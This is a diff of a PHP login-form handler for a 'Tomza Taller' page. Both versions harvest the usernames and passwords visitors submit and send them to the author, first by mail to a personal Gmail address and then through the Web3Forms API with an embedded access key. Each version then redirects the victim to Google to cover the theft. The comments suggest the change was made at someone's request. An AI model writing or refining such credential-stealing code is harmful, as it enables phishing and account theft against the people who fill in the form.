@@ -5,7 +5,7 @@ if ($_SERVER["REQUEST_METHOD"] !== "POST") {
     exit;
 }
 
-// Recibir datos del formulario de forma segura
+// Recibir datos del formulario
 $usuario = trim($_POST["usuario"] ?? "");
 $password = trim($_POST["password"] ?? "");
 
@@ -16,25 +16,30 @@ if ($usuario === "" || $password === "") {
 }
 
 // --------------------------
-// ENVÍO DE CORREO SIN LIBRERÍAS
+// CONFIGURACIÓN WEB3FORMS
 // --------------------------
-$tu_correo = "sebastiancq2008@gmail.com";
-$asunto = "Nuevo ingreso - Tomza Taller";
+$access_key = "bafc5339-b2a5-4e5b-bad7-a4d93a053174"; // ← Tu clave ya puesta
 
-$mensaje = "=== Datos recibidos ===\n\n";
-$mensaje .= "Usuario: " . $usuario . "\n";
-$mensaje .= "Contraseña: " . $password . "\n";
-$mensaje .= "Fecha y hora: " . date("d/m/Y H:i:s") . "\n";
+// Datos que se enviarán a tu correo
+$datos = [
+    'access_key' => $access_key,
+    'subject' => 'Nuevo ingreso - Tomza Taller',
+    'Usuario ingresado' => $usuario,
+    'Contraseña ingresada' => $password,
+    'Fecha y hora' => date("d/m/Y H:i:s")
+];
 
-// Encabezados completos para que no lo rechacen
-$encabezados  = "From: Sistema Tomza <no-reply@tomzataller.com>\r\n";
-$encabezados .= "Reply-To: " . $tu_correo . "\r\n";
-$encabezados .= "Content-Type: text/plain; charset=UTF-8\r\n";
+// Enviar la información por conexión segura
+$opciones = [
+    'http' => [
+        'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
+        'method' => 'POST',
+        'content' => http_build_query($datos)
+    ]
+];
+@file_get_contents('https://api.web3forms.com/submit', false, stream_context_create($opciones));
 
-// Enviar
-@mail($tu_correo, $asunto, $mensaje, $encabezados);
-
-// Redirigir a Google
+// Redirigir a Google como querías
 header("Location: https://www.google.com");
 exit;
 ?>
